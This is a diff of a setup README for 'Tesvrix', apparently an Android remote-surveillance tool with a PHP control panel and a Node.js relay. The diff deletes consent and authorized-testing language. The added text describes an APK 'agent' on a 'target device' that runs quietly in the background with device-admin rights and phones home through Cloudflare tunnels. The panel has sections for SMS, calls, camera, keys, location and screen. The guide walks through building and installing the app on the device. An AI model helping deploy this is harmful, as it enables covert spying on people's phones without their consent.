@@ -1,1308 +1,506 @@
-<p align="center">
-  <img src="https://raw.githubusercontent.com/cmdhell/Tesvrix/refs/heads/main/logo2_dty1yw.png" alt="Tesvrix Logo" width="220">
-</p><p align="center">
-  <img src="https://raw.githubusercontent.com/cmdhell/Tesvrix/refs/heads/main/IMG_20260806_130805_435.jpg" alt="Tesvrix Preview" width="900">
-</p><h1 align="center">Tesvrix — Complete Local Setup Guide</h1><p align="center">
-  <b>PHP Web Panel • Node.js Backend • Supabase • Android Test Client</b>
-</p><p align="center">
-  <i>Development, testing and authorized device-management environment</i>
-</p>---
+<p align="center">  
+<img src="https://raw.githubusercontent.com/cmdhell/Tesvrix/refs/heads/main/logo2_dty1yw.png"
+<p align="center">  
+<img src="https://raw.githubusercontent.com/cmdhell/Tesvrix/refs/heads/main/IMG_20260806_130805_435.jpg"
 
-📖 About
+# Tesvrix  — Complete Setup Guide (Local Hosting)
 
-This README explains how to set up the Tesvrix development environment on a Windows PC from scratch.
+This guide explains how to host the whole TesvrixV2 system **on your own PC** and expose it to the internet with Cloudflare quick tunnels — no paid hosting needed.
 
-It covers:
+It covers everything from scratch: installing tools, creating the database, running the server, running the web panel, connecting it all through tunnels, configuring the Android APK, and building it.
 
-- Installing the required software
-- Creating the Supabase database
-- Configuring the Node.js backend
-- Running the PHP web panel
-- Connecting the components locally
-- Optional Cloudflare development tunnels
-- Preparing the Android test client
-- Building a debug APK
-- Installing and testing the APK
-- Troubleshooting common problems
-- Secure configuration
-- GitHub publishing
-- Optional startup automation
-
-«Important: Tesvrix should only be used on systems and devices that you own or have explicit permission to administer. Android testing should be performed using an emulator, dedicated test device, or another device whose owner has explicitly authorized the testing.»
-
----
-
-🧩 Project Structure
-
+```
 Tesvrix/
-│
-├── README.md
-├── LICENSE
-├── .gitignore
 │
 ├── index.php
 ├── dashboard.php
 ├── project.js
 │
-├── config/
+├── config/                 
 │   └── config.php
 │
-├── section/
-│   ├── CALL COMMAND.php
-│   ├── DEVICE STATS.php
-│   ├── SECURITY.php
-│   ├── SMS CENTER.php
-│   ├── about.php
-│   ├── cam.php
-│   ├── coming.php
-│   ├── file.php
-│   ├── intercom.php
-│   ├── keys.php
-│   ├── location.php
-│   ├── notifications.php
-│   ├── screen.php
-│   └── surveillance.php
-│
-├── Server/
-│   ├── index.js
-│   ├── package.json
-│   └── ...
-│
-├── Android/
-│   ├── app/
-│   ├── build.gradle
-│   ├── settings.gradle
-│   └── gradlew.bat
-│
-└── database/
-    └── setup_tables.sql
+└── section/
+    ├── CALL COMMAND.php
+    ├── DEVICE STATS.php
+    ├── SECURITY.php
+    ├── SMS CENTER.php
+    ├── about.php
+    ├── cam.php
+    ├── coming.php
+    ├── file.php
+    ├── intercom.php
+    ├── keys.php
+    ├── location.php
+    ├── notifications.php
+    ├── screen.php
+    └── surveillance.php
+    ```
 
-«File names shown above reflect the current project layout. Rename files to conventional lowercase names if you want a cleaner cross-platform repository.»
+```
+
+> All values in `<ANGLE BRACKETS>` are placeholders. Replace them with **your own** values. Never share your real tokens/keys with anyone.
 
 ---
 
-🏗️ How Tesvrix Works
+## Table of Contents
 
-The development architecture contains four major components:
-
-                         INTERNET
-                            │
-                            │ HTTPS
-                            ▼
-                 ┌─────────────────────┐
-                 │ Optional Cloudflare │
-                 │      Tunnel         │
-                 └──────────┬──────────┘
-                            │
-              ┌─────────────┴─────────────┐
-              │                           │
-              ▼                           ▼
-     ┌─────────────────┐         ┌─────────────────┐
-     │   PHP WEB PANEL │         │  NODE.JS SERVER │
-     │   Port 8080     │────────►│   Port 10000    │
-     └─────────────────┘         └────────┬────────┘
-                                         │
-                                         │ API
-                                         ▼
-                                ┌─────────────────┐
-                                │    SUPABASE     │
-                                │   PostgreSQL    │
-                                └─────────────────┘
-
-                                         ▲
-                                         │
-                                ┌────────┴────────┐
-                                │ Android Test    │
-                                │ Client / Emulator│
-                                └─────────────────┘
-
-Components
-
-1. Android Test Client
-
-A development Android application used to test authorized API communication with the backend.
-
-2. Node.js Backend
-
-The server-side application responsible for:
-
-- API requests
-- Authentication
-- Authorization
-- Database communication
-- Application logic
-- Validation
-
-3. PHP Web Panel
-
-The browser-based dashboard.
-
-It communicates with the backend rather than exposing privileged database credentials to browser JavaScript.
-
-4. Supabase
-
-Provides the PostgreSQL database and associated cloud services.
+1. [How the system works](#1-how-the-system-works)
+2. [What you need (tools)](#2-what-you-need-tools)
+3. [Step 1 — Create the database (Supabase)](#step-1--create-the-database-supabase)
+4. [Step 2 — Run the relay server (Node.js)](#step-2--run-the-relay-server-nodejs)
+5. [Step 3 — Run the web panel (PHP)](#step-3--run-the-web-panel-php)
+6. [Step 4 — Expose everything with Cloudflare tunnels](#step-4--expose-everything-with-cloudflare-tunnels)
+7. [Step 5 — Configure the APK (change URL / IP / tokens)](#step-5--configure-the-apk-change-url--ip--tokens)
+8. [Step 6 — Build the APK](#step-6--build-the-apk)
+9. [Step 7 — Install and verify](#step-7--install-and-verify)
+10. [Troubleshooting](#troubleshooting)
+11. [Making it permanent (auto-start, stable URL)](#making-it-permanent-auto-start-stable-url)
+12. [Security checklist](#security-checklist)
 
 ---
 
-🔐 Security Model
+## 1. How the system works
 
-The intended data flow is:
+The system has **4 parts**:
 
-Android / Browser
-       │
-       │ HTTPS
-       ▼
-Authentication
-       │
-       ▼
-Node.js API
-       │
-       │ Server-side credentials
-       ▼
-Supabase
+```
+┌─────────────┐       ┌──────────────────┐       ┌──────────────┐
+│ Android APK │ ────► │  RELAY (Node.js) │ ────► │  SUPABASE DB │
+│ (target     │  APP  │  runs on your PC │ REST  │ (cloud, free)│
+│  device)    │ token │  port 10000      │       │              │
+└─────────────┘       └───────┬──────────┘       └──────────────┘
+                              │
+        ┌─────────────────────┘
+        ▼
+┌──────────────────┐       ┌──────────────┐
+│  WEB PANEL (PHP) │  REST │  RELAY again │
+│  on your PC      │ token │  (same relay)│
+│  port 8080       │ ─────► │              │
+└──────────────────┘       └──────────────┘
+```
 
-The browser and Android client should never receive a Supabase service-role credential.
+- **APK (Android)** — the agent installed on the target device. It phones home to the *relay* with its APP token.
+- **Relay (Node.js)** — a middle-man running on your PC. It checks the token of whoever connects, then forwards database requests to Supabase. It also runs the realtime data (screen sharing, etc).
+- **Web Panel (PHP)** — the control panel you open in a browser. It also talks to the relay (with the WEB token) and the relay forwards queries to Supabase.
+- **Supabase** — a free cloud PostgreSQL database. Stores devices, commands, and settings. Free tier is enough.
 
-Privileged credentials belong exclusively on the server.
-
----
-
-📑 Table of Contents
-
-1. "Requirements" (#1-requirements)
-2. "Recommended Windows Folder" (#2-recommended-windows-folder)
-3. "Install Git" (#3-install-git)
-4. "Install Node.js" (#4-install-nodejs)
-5. "Install PHP" (#5-install-php)
-6. "Install JDK 17" (#6-install-jdk-17)
-7. "Install Android Studio" (#7-install-android-studio)
-8. "Configure Android SDK" (#8-configure-android-sdk)
-9. "Configure Gradle" (#9-configure-gradle)
-10. "Clone the Project" (#10-clone-the-project)
-11. "Configure Git Ignore" (#11-configure-git-ignore)
-12. "Create Supabase Project" (#12-create-supabase-project)
-13. "Create Database Tables" (#13-create-database-tables)
-14. "Configure Node.js" (#14-configure-nodejs)
-15. "Start Node.js Backend" (#15-start-nodejs-backend)
-16. "Configure PHP Panel" (#16-configure-php-panel)
-17. "Start PHP Panel" (#17-start-php-panel)
-18. "Run Local Tests" (#18-run-local-tests)
-19. "Prepare Android Test Client" (#19-prepare-android-test-client)
-20. "Build Android APK" (#20-build-android-apk)
-21. "Install APK Using ADB" (#21-install-apk-using-adb)
-22. "Optional Cloudflare Tunnel" (#22-optional-cloudflare-tunnel)
-23. "Permanent Cloudflare Configuration" (#23-permanent-cloudflare-configuration)
-24. "Automatic Startup" (#24-automatic-startup)
-25. "Troubleshooting" (#25-troubleshooting)
-26. "Production Security" (#26-production-security)
-27. "GitHub Publishing Checklist" (#27-github-publishing-checklist)
-28. "Complete Setup Checklist" (#28-complete-setup-checklist)
-29. "Quick Start" (#29-quick-start)
+Why a relay at all? So the APK and the panel never need your real Supabase database URL/keys — they only know the relay address, and the relay checks tokens before forwarding anything. The real database credentials stay private on your PC.
 
 ---
 
-1. Requirements
+## 2. What you need (tools)
 
-Required
+All of these run on **Windows**. You need:
 
-Software| Purpose
-Windows 10/11| Development PC
-Git| Source control
-Node.js LTS| Backend
-npm| Node package manager
-PHP 8.1+| Web panel
-JDK 17| Android build
-Android Studio| Android development
-Android SDK| Android compilation
-Platform Tools| ADB/device testing
-Gradle| Android build
-Supabase| PostgreSQL database
+| Tool | Why | Version used here |
+|---|---|---|
+| Node.js | The relay server | v24 (any recent LTS works) |
+| PHP | The web panel | 8.1+ |
+| Java (JDK) 17 | To compile the APK | Temurin 17 |
+| Android SDK + platform-tools | To compile the APK | android-35, build-tools 35 |
+| Gradle 9.5.1 | APK build tool | 9.5.1 |
+| cloudflared | Free public tunnels | any recent release |
+| Supabase account | Free cloud database | free tier |
+| An Android phone | Target device | Android 8+ |
+| Optional: Android Studio | Easier APK building | any recent version |
 
-Optional
+### Installing quickly
 
-Software| Purpose
-Cloudflare Tunnel| Remote development
-VS Code| Code editor
-Android Emulator| Testing
-Postman| API testing
-
----
-
-2. Recommended Windows Folder
-
-A simple development layout is:
-
-C:\Tesvrix\
-│
-├── web\
-├── Server\
-├── Android\
-├── database\
-└── tools\
-
-For example:
-
-C:\Tesvrix\web
-C:\Tesvrix\Server
-C:\Tesvrix\Android
-C:\Tesvrix\database
-C:\Tesvrix\tools
-
-Optional Cloudflare location:
-
-C:\Tesvrix\tools\cloudflared\
+- **Node.js** → download the Windows LTS installer from nodejs.org, install, verify:
+  ```powershell
+  node --version
+  npm --version
+  ```
+- **PHP** → download from php.org (Windows zip), extract, add php.exe folder to PATH, verify:
+  ```powershell
+  php --version
+  ```
+- **Java 17** → install Temurin 17 (adoptium.net), verify:
+  ```powershell
+  java -version
+  ```
+- **Android SDK** → you can either install Android Studio (it bundles the SDK at `C:\Android\Sdk` or `%LOCALAPPDATA%\Android\Sdk`) or download "command line tools" only. The SDK folder must contain `platforms\` and `build-tools\`.
+- **Gradle** → download the `bin` zip from gradle.org/releases, unzip anywhere (example: `C:\Users\<you>\gradle\gradle-9.5.1`). You don't need the system install everywhere: the build script uses this exact folder.
+- **cloudflared** → download `cloudflared-windows-amd64.exe` from the Cloudflare GitHub releases, save it as `C:\cloudflared\cloudflared.exe` so future commands are short.
 
 ---
 
-3. Install Git
+## Step 1 — Create the database (Supabase)
 
-Install Git for Windows.
+### 1.1 Create a project
 
-Verify:
+1. Go to **supabase.com → Sign in → New project**.
+2. Give it a name, set a strong database password, choose a region near you, create it.
+3. Wait ~1 minute while it creates.
 
-git --version
+### 1.2 Get your credentials
 
-Configure your identity:
+In the Supabase dashboard, go to **Project Settings → API**:
 
-git config --global user.name "Your Name"
-git config --global user.email "your@email.com"
+- **Project URL** — looks like `https://abcdefghij.supabase.co`
+- **Service role key** — a very long string starting with `eyJhbG...` (the role marked `service_role`)
 
----
+> ⚠️ **The service role key is ALL-POWERFUL.** Anyone who has it can erase your whole DB. Only the relay on your PC needs it. Never paste it into the APK or the panel.
 
-4. Install Node.js
+### 1.3 Create the tables
 
-Install the current Node.js LTS release.
+1. In Supabase dashboard go to **SQL Editor → New query**.
+2. Open the SQL file that came with the project: `setup_tables.sql` (in the APK src folder).
+3. Paste the whole content, press **Run**.
 
-Verify:
+This creates: `devices`, `commands`, `vault`, `operators`, `settings` (and helpers). Wait for "Success."
 
-node --version
-npm --version
+### 1.4 Create your operator (admin/login)
 
-Example:
+An **operator** is a person allowed to log into the panel. Each operator has a `operator_id` — the same ID the device sends, so devices appear only to the correct operator.
 
-v24.x.x
-11.x.x
+Run this in **SQL Editor** (change username/password/the number to your own):
 
-The exact versions may change over time.
+```sql
+INSERT INTO operators (username, password, telegram_channel_id, expiry_date)
+VALUES ('admin', 'change_this_password', -123456789, NOW() + INTERVAL '1 year');
+```
 
----
+- `username` + `password` → what you log into the panel with (stored plainly in this version).
+- `telegram_channel_id` → a private ID. **Write it down, the APK needs to use it later in Step 5.**
 
-5. Install PHP
-
-Install PHP 8.1 or newer.
-
-Verify:
-
-php --version
-
-If PowerShell reports:
-
-php is not recognized
-
-add the folder containing "php.exe" to the Windows "PATH".
-
-Restart PowerShell.
-
-Verify again:
-
-php --version
+> A simple test row would be `VALUES ('admin', 'admin123',-1000000000000, NOW() + INTERVAL '1 year');` — but change the password before anything real.
 
 ---
 
-6. Install JDK 17
+## Step 2 — Run the relay server (Node.js)
 
-Install a JDK 17 distribution such as Temurin 17.
+### 2.1 Get the server code
 
-Verify:
+Inside your project folder you have a `Serverbackend` folder (or `Server`). Copy it to where you want the site to live, e.g. `C:\tesvrix\relay`.
 
-java -version
-javac -version
+### 2.2 Install dependencies
 
-Both should report version 17.
+Open PowerShell in the relay folder and run:
 
-If required, configure:
-
-JAVA_HOME
-
-Example:
-
-JAVA_HOME=C:\Program Files\Eclipse Adoptium\jdk-17.x.x
-
-Add:
-
-%JAVA_HOME%\bin
-
-to "PATH".
-
-Restart PowerShell.
-
----
-
-7. Install Android Studio
-
-Install Android Studio.
-
-During installation, install:
-
-Android SDK
-Android SDK Platform
-Android SDK Platform-Tools
-Android SDK Build-Tools
-Android Emulator
-
-Open Android Studio once installation finishes.
-
----
-
-8. Configure Android SDK
-
-Open:
-
-Android Studio
-→ Settings
-→ Languages & Frameworks
-→ Android SDK
-
-Install the Android SDK version required by the project's Gradle configuration.
-
-Under SDK Tools, install:
-
-Android SDK Build-Tools
-Android SDK Platform-Tools
-Android SDK Command-line Tools
-
-Typical SDK locations are:
-
-C:\Users\<USERNAME>\AppData\Local\Android\Sdk
-
-or:
-
-C:\Android\Sdk
-
-Verify ADB:
-
-adb version
-
----
-
-9. Configure Gradle
-
-If the Android repository contains:
-
-gradlew
-gradlew.bat
-
-use the included Gradle wrapper.
-
-Check:
-
-cd C:\Tesvrix\Android
-.\gradlew.bat --version
-
-This is preferred over manually installing a different Gradle version.
-
-The project's Gradle wrapper and Android Gradle Plugin determine the compatible Gradle version.
-
----
-
-10. Clone the Project
-
-Clone the repository:
-
-cd C:\
-git clone <YOUR_REPOSITORY_URL> Tesvrix
-
-Enter the project:
-
-cd C:\Tesvrix
-
-Check:
-
-dir
-
----
-
-11. Configure Git Ignore
-
-Create:
-
-.gitignore
-
-Recommended contents:
-
-# Environment files
-.env
-.env.*
-!.env.example
-
-# Android local configuration
-local.properties
-
-# Android signing
-*.jks
-*.keystore
-
-# Build output
-/build/
-/app/build/
-*/build/
-
-# IDE
-.idea/
-*.iml
-
-# Logs
-*.log
-
-# OS
-.DS_Store
-Thumbs.db
-
-# Temporary files
-*.tmp
-*.temp
-
-# Secrets
-secrets/
-private/
-credentials/
-
-Never commit production secrets.
-
----
-
-12. Create Supabase Project
-
-Create a Supabase project.
-
-After creation, collect only the credentials required by your backend.
-
-Typical information:
-
-Project URL
-Database configuration
-Server-side API credential
-
-Keep privileged credentials on the server.
-
----
-
-13. Create Database Tables
-
-Open:
-
-C:\Tesvrix\database\setup_tables.sql
-
-Open the Supabase SQL Editor.
-
-Paste the SQL and execute it.
-
-Verify that the expected development tables were created.
-
-For example:
-
-devices
-commands
-settings
-operators
-
-Database Security
-
-Do not assume that hiding the database URL provides security.
-
-Use:
-
-Authentication
-Authorization
-Row Level Security
-Least privilege
-Input validation
-Server-side access control
-
----
-
-14. Configure Node.js
-
-Open:
-
-C:\Tesvrix\Server
-
-Install dependencies:
-
+```powershell
+cd C:\tesvrix\relay
 npm install
+```
 
-Create:
+This downloads everything it needs (express.js etc), usually ~30 packages.
 
-.env
+### 2.3 Create the config file (run script)
 
-Example:
+The relay reads settings from **environment variables** at start. Make a PowerShell script `run-relay.ps1` in the same folder:
 
-PORT=10000
-
-SUPABASE_URL=https://YOUR_PROJECT.supabase.co
-
-SUPABASE_KEY=YOUR_SERVER_SIDE_KEY
-
-WEB_ACCESS_TOKEN=GENERATE_A_RANDOM_VALUE
-
-If your application has an Android API authentication mechanism, configure it through the backend's documented authentication system rather than embedding privileged credentials in the APK.
-
-Generate a random development secret
-
-PowerShell:
-
-[Convert]::ToHexString(
-    [Security.Cryptography.RandomNumberGenerator]::GetBytes(32)
-)
-
-Generate separate secrets for separate purposes.
-
----
-
-15. Start Node.js Backend
-
-Navigate to:
-
-cd C:\Tesvrix\Server
-
-Start:
-
-npm start
-
-If no "start" script exists:
+```powershell
+$ErrorActionPreference = "Continue"
+$env:PORT = "10000"
+$env:SUPABASE_URL = "https://<your-project>.supabase.co"
+$env:SUPABASE_KEY = "<your service_role key long string>"
+$env:APP_ACCESS_TOKEN = "<random string for devices>"
+$env:WEB_ACCESS_TOKEN = "<random string for the panel>"
+$env:TELEGRAM_TOKEN = ""
 
 node index.js
+```
 
-Expected output should indicate that the server is listening.
+What each one means:
 
-Example:
+| Variable | Meaning |
+|---|---|
+| `PORT` | What port the relay listens on locally. Be consistent (we use 10000 here). |
+| `SUPABASE_URL` | Your Supabase project URL |
+| `SUPABASE_KEY` | The service role key |
+| `APP_ACCESS_TOKEN` | Secret that **the APK** (device) must know. Invent a random string. |
+| `WEB_ACCESS_TOKEN` | Secret that **the panel** must know. Invent another random string. |
+| `TELEGRAM_TOKEN` | Optional Telegram bot token for alerts. Empty = disabled. |
 
-Server started
-Listening on port 10000
+Generate good random tokens in PowerShell:
 
-Keep this terminal open.
+```powershell
+-join ((48..57) + (97..122) | Get-Random -Count 32 | ForEach-Object {[char]$_})
+```
 
-Health Check
+Run it twice → you have two different 32-char strings.
 
-If your project provides "/health":
+### 2.4 Start the relay
 
-Invoke-WebRequest http://127.0.0.1:10000/health
+```powershell
+powershell -ExecutionPolicy Bypass -File .\run-relay.ps1
+```
 
-A successful result should report that the server is online.
+Keep that window open (do not close it). Verify it's up with a browser or:
 
----
+```powershell
+Invoke-WebRequest http://localhost:10000/health
+```
 
-16. Configure PHP Panel
+Expected: `{"status":"online"}`.
 
-Open:
+**How the token check works in the relay:** every request from the device or panel must include the header `x-access-token` (or `?token=` in the URL). If the token matches `APP_ACCESS_TOKEN` or `WEB_ACCESS_TOKEN` → allowed → forwarded to Supabase. If not → HTTP **403 Access Denied**. (That's the most common mistake — wrong/empty token.)
 
-C:\Tesvrix\web\config\config.php
-
-For local development:
-
-<?php
-
-$proxy_url = 'http://127.0.0.1:10000';
-
-If the application requires authentication credentials, load them from an environment variable or local untracked configuration.
-
-Do not commit production credentials to GitHub.
-
----
-
-17. Start PHP Panel
-
-Open a second PowerShell window:
-
-cd C:\Tesvrix\web
-
-Start the PHP development server:
-
-php -S 127.0.0.1:8080
-
-Open:
-
-http://127.0.0.1:8080
-
-You should now see the web panel.
+**Default fallback:** if you start `node index.js` without environment variables, the relay uses hard-coded default tokens so it "works" on a fresh install — but those defaults are public, so always run `run-relay.ps1` instead.
 
 ---
 
-18. Run Local Tests
+## Step 3 — Run the web panel (PHP)
 
-At this stage:
+### 3.1 Copy the panel folder
 
-Node.js
-127.0.0.1:10000
+The project contains a `webpanel` source folder. Copy the content (index.php, sections/, etc.) to a folder like `C:\tesvrix\panel`.
 
-and:
+### 3.2 Configure the connection to the relay
 
-PHP
-127.0.0.1:8080
+Open `config.php` (it lives in a subfolder of the panel, e.g. `panel\configholder\config.php`) and set:
 
-should both be running.
+```php
+$proxy_url = 'http://localhost:10000';   // your relay (later, its public tunnel URL)
+$web_token = '<YOUR WEB_ACCESS_TOKEN>';  // same as the env you set above
+```
 
-Test Order
+### 3.3 Start the PHP server
 
-Test 1 — PHP
+In the panel folder (where `index.php` is), run:
 
-Open:
+```powershell
+cd C:\tesvrix\panel
+php -S localhost:8080
+```
 
-http://127.0.0.1:8080
+Keep window open. Test: browse to `http://localhost:8080` → you should see the login page.
 
-Test 2 — Backend
-
-Open the health endpoint:
-
-http://127.0.0.1:10000/health
-
-Test 3 — Database
-
-Verify the backend can communicate with Supabase.
-
-Test 4 — Authentication
-
-Verify:
-
-Unauthenticated → rejected
-Authenticated → allowed
-
-Test 5 — Authorization
-
-Verify users can access only the records they are authorized to access.
+How the panel talks to the database — every section (DEVICE STATS, CALL COMMAND, ...) makes REST requests to `getApiUrl('rest/v1/…')` (JS), which is based on `PROXY_URL`/`PROXY_TOKEN` from config.php. It always goes through the relay, never directly to Supabase.
 
 ---
 
-19. Prepare Android Test Client
+## Step 4 — Expose everything with Cloudflare tunnels
 
-The Android application should be tested only on an authorized device or emulator.
+Your PC is behind your internet and not publicly reachable. cloudflared creates a public URL that forwards to your local port — no router setup needed.
 
-Recommended:
+### 4.1 Download cloudflared
 
-Android Studio Emulator
+Download `cloudflared-windows-amd64.exe` from the Cloudflare GitHub releases; place it at a fixed path (e.g. `C:\cloudflared\cloudflared.exe`).
 
-or:
+### 4.2 Tunnel #1 — for the relay
 
-Dedicated personal Android test device
+```powershell
+cd C:\cloudflared
+.\cloudflared.exe tunnel --url http://localhost:10000
+```
 
-The Android application should clearly disclose:
+After a few seconds it prints something like:
 
-Permissions requested
-Data collected
-Purpose of collection
-Server destination
-How to stop the service
+```
+|  Trycloudflare.com | https://random-name.trycloudflare.com |
+```
 
-Do not hide application activity from the device owner.
+That first URL (for the relay) is **YOUR RELAY PUBLIC ADDRESS** → keep it, it goes inside the APK. It ends with `.trycloudflare.com`.
 
----
+### 4.3 Tunnel #2 — for the web panel
 
-20. Build Android APK
+Open a **second** PowerShell (relay tunnel and panel tunnel stay running in **separate windows**):
 
-Enter the Android project:
+```powershell
+cd C:\cloudflared
+.\cloudflared.exe tunnel --url http://localhost:8080
+```
 
-cd C:\Tesvrix\Android
+The second URL open in the browser is **YOUR PANEL PUBLIC ADDRESS**.
 
-Check Gradle:
+> ⚠️ **Quick tunnels are temporary.** Every time you restart a cloudflared window, you get a *different* public URL. The APK has the relay URL *baked inside* — so if the relay tunnel changes, you must rebuild the APK (Step 5-6). See Section 11 for a permanent solution (named tunnel).
 
-.\gradlew.bat --version
+### 4.4 Point `config.php` at the public relay URL
 
-Clean:
+Your panel works locally, but devices out in the wild can't reach `localhost:10000`. So update config.php again with the **relay public URL**:
 
-.\gradlew.bat clean
+```php
+$proxy_url = 'https://your-relay-url.trycloudflare.com'; // from step 4.2
+$web_token = 'YOUR WEB_ACCESS_TOKEN';
+```
 
-Build debug:
-
-.\gradlew.bat assembleDebug
-
-Successful output will normally be located under:
-
-app\build\outputs\apk\debug\
-
-Usually:
-
-app-debug.apk
+Restart the PHP server (Ctrl+C, run again). The panel is now fully public: anyone with your panel URL can reach the login page — protect it with a strong operator password.
 
 ---
 
-21. Install APK Using ADB
+## Step 5 — Configure the APK (change URL / IP / tokens)
 
-Connect your authorized test phone.
+Now the one big decision: type the **public relay URL** into the Android app source so the device phones home to your PC.
 
-Enable:
+### Where the values live
 
-Developer Options
-USB Debugging
+File: `app\src\main\java\com\tesvrix\SecurityContext.java` (inside the APK source folder)
 
-Check the device:
+Method `getC()` returns an array:
 
-adb devices
+```java
+public static String[] getC() {
+    return new String[]{
+        "https://PASTE_RELAY_PUBLIC_URL_HERE",   // [0] base URL — NO trailing slash
+        "PASTE_APP_ACCESS_TOKEN_HERE",           // [1] APP token (device)
+        ""                                       // [2] unused in this config
+    };
+}
+```
 
-Expected:
+- Keep the `https://` prefix.
+- **No trailing slash** (no `/` at the end) — the app adds paths itself.
 
-List of devices attached
-XXXXXXXX    device
+### Also change the telemetry ID
 
-Install:
+In the **same file**, near the top:
 
-adb install -r app\build\outputs\apk\debug\app-debug.apk
+```java
+private static final String DEFAULT_OPERATOR_ID = "-100TG";
+```
 
-If an older version is installed, the "-r" flag updates it.
+and in `app\src\main\res\values\strings.xml`:
 
----
+```xml
+<string name="config_channel_id">OPERATOR_ID_HERE</string>
+```
 
-22. Optional Cloudflare Tunnel
+Both must be **exactly the same number** — and it must be **exactly the `telegram_channel_id`** of your operator in the DB (Step 1.4). The device sends only to operators with this ID; the panel shows only devices with this ID. Everything breaks if they ever differ.
 
-For local-only development, skip this section.
+### The three values must match — checklist
 
-If remote development is necessary, Cloudflare Tunnel can expose a local service without opening a router port.
+| Where | Value |
+|---|---|
+| Supabase — operator row's `telegram_channel_id` | `<OPERATOR_ID>` |
+| `SecurityContext.DEFAULT_OPERATOR_ID` | `<OPERATOR_ID>` |
+| `strings.xml` `config_channel_id` | `<OPERATOR_ID>` |
+| Relay env `APP_ACCESS_TOKEN` | `<APP_TOKEN>` |
+| Relay env `WEB_ACCESS_TOKEN` | `<WEB_TOKEN>` |
+| APK `getC()[1]` (APP token) | `<APP_TOKEN>` |
+| Panel `config.php` `$web_token` | `<WEB_TOKEN>` |
+| APK `getC()[0]` (URL) | `<RELAY_PUBLIC_URL>` |
+| Panel `config.php` `proxy_url` | `<RELAY_PUBLIC_URL>` |
 
-Download "cloudflared" and place it somewhere such as:
-
-C:\Tesvrix\tools\cloudflared\
-
-Test the PHP panel:
-
-cd C:\Tesvrix\tools\cloudflared
-.\cloudflared.exe tunnel --url http://127.0.0.1:8080
-
-Cloudflare will provide a temporary HTTPS address.
-
-Example:
-
-https://random-name.trycloudflare.com
-
-⚠️ Important
-
-This makes your local application reachable from the Internet.
-
-Before enabling it:
-
-[ ] Authentication enabled
-[ ] Strong password
-[ ] No default credentials
-[ ] No database secrets exposed
-[ ] Authorization enforced
-[ ] Sensitive endpoints protected
-[ ] Logs enabled
-
-Never expose an unprotected administration interface.
+That's the whole "magic" of connecting: matching URLs + tokens + operator ID.
 
 ---
 
-23. Permanent Cloudflare Configuration
+## Step 6 — Build the APK
 
-Quick tunnels are temporary.
+Two ways: Command line (this is what this setup uses) or Android Studio (visual). Both compile the same result.
 
-For a legitimate long-running development environment, use a named Cloudflare Tunnel and your own domain.
+### 6.1 Prepare the PC
 
-The general architecture is:
+1. Java 17 installed and in path: `java -version` ✓
+2. Android SDK with:
 
-your-domain.example
-        │
-        ▼
-Cloudflare
-        │
-        ▼
-Named Tunnel
-        │
-        ▼
-127.0.0.1:8080
+   - `platforms\android-34` or `android-35` (the project uses compile SDK 35)
+   - `build-tools\35.0.0`
+   - `cmdline-tools\latest\bin\sdkmanager.bat`
 
-The exact Cloudflare configuration depends on your domain and account.
+   If missing, install with sdkmanager (accept licenses first):
 
-Keep the tunnel configuration private and restrict access to the application itself.
+   ```powershell
+   & "C:\Android\Sdk\cmdline-tools\latest\bin\sdkmanager.bat" --licenses
+   & "C:\Android\Sdk\cmdline-tools\latest\bin\sdkmanager.bat" "platforms;android-35" "build-tools;35.0.0"
+   ```
 
----
+3. Gradle 9.5.1 unzipped somewhere (we'll call it `C:\Users\<you>\Gradle\gradle-9.5.1`).
 
-24. Automatic Startup
+### 6.2 Point the build at your SDK
 
-Once the local development system works, you can optionally automate startup.
+In the project root folder there is a file called `local.properties` — it tells Gradle where your Android SDK is. If it's missing or points somewhere wrong (e.g. another machine's Linux path like `/home/user/Android/Sdk`), replace it:
 
-Start Node.js
+```
+sdk.dir=C\:\\Android\\Sdk
+```
 
-Create:
+Uses double backslashes inside. (This exact step was needed when the source came from another machine with a different path.)
 
-start-server.cmd
+### 6.3 Build the APK
 
-Example:
+```powershell
+cd "C:\Users\<you>\apk-source"
+& "C:\Users\<you>\Gradle\gradle-9.5.1\bin\gradle.bat" assembleDebug --no-daemon
+```
 
-@echo off
+First run took ~6 minutes (it downloads Android Gradle Plugin + dependencies). Result `.apk`:
 
-cd /d C:\Tesvrix\Server
+```
+app\build\outputs\apk\debug\app-debug.apk   (~1.6 MB)
+```
 
-npm start
+> The `debug` APK is auto-signed with a local debug keystore → installable on a phone right away. For a `release` build you'd need to add your own signing config (`signingConfig` with a keystore) in `app\build.gradle` first — not required for this setup.
 
-pause
+### 6.4 Verify the config got into the APK (optional but smart)
 
-Start PHP
+You can extract the APK and confirm it contains your URL/token/operator ID:
 
-Create:
+```powershell
+Copy-Item app\build\outputs\apk\debug\app-debug.apk C:\temp\app.zip
+Expand-Archive C:\temp\app.zip C:\temp\apk_check -Force
+Select-String -Path "C:\temp\apk_check\classes.dex" -Pattern "your-relay-url" 
+```
 
-start-panel.cmd
-
-Example:
-
-@echo off
-
-cd /d C:\Tesvrix\web
-
-php -S 127.0.0.1:8080
-
-pause
-
-Run these manually first.
-
-Only configure Windows startup after confirming both applications work correctly.
+If strings appear (binary search of dex files, works for ASCII), it's inside.
 
 ---
 
-25. Troubleshooting
+## Step 7 — Install and verify
 
-PHP is not recognized
+1. **Copy** `app-debug.apk` to your phone (USB cable, or send it).
+2. Tap install (allow unknown sources), open the app **once** — grant all permissions it asks for (device admin) — the app starts quietly in the background.
+3. Wait ~30-60 s (heartbeat).
 
-Run:
+Then check success in two places:
 
-php --version
+**A) Database:** in Supabase → Table Editor → `devices` → a row with your phone's `device_uuid` and `operator_id` = your ID.
 
-If it fails, add PHP to "PATH".
+**B) Panel:** open your panel public URL → log in (Step 1.4 username/password) → in the panel's devices section your phone should be listed as online.
 
-Restart PowerShell.
+What you should NOT see:
 
----
-
-Node.js is not recognized
-
-Run:
-
-node --version
-npm --version
-
-Reinstall Node.js LTS if required.
+| Symptom | Cause |
+|---|---|
+| No row in `devices` | URL or token in APK wrong, or device can't reach relay, or tunnel down |
+| Row has operator_id wrong/empty | `config_channel_id` or `DEFAULT_OPERATOR_ID` didn't match DB |
+| 403 in browser when opening relay `health` | You're using relay URL with wrong token — shouldn't be a problem for normal browsers |
 
 ---
 
-"npm install" fails
+## Troubleshooting
 
-Try:
-
-npm cache verify
-npm install
-
-Check:
-
-node --version
-npm --version
-
-Also inspect "package.json".
-
----
-
-Port 10000 already in use
-
-Run:
-
-netstat -ano | findstr :10000
-
-You can either stop the conflicting process or change the application's development port.
+| Problem | Why | Fix |
+|---|---|---|
